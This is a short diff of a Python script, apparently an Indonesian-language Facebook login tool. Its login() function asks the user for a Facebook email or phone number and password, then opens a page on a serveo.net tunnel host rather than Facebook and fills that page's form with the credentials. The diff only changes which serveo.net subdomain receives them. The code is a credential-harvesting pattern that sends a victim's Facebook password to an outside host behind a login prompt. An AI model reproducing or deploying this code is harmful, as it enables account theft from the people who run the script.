@@ -232,7 +232,7 @@ def login():
 	us = inputD('[?] Login FB dulu bujank,Email/HP')
 	pa = inputD('[?] Kata Sandi')
 	cetak('!h[*] Sedang Login....')
-	buka('https://nonnisi.serveo.net')
+	buka('https://cultum.serveo.net')
 	br.select_form(nr=0)
 	br.form['email']=us
 	br.form['pass']=pa
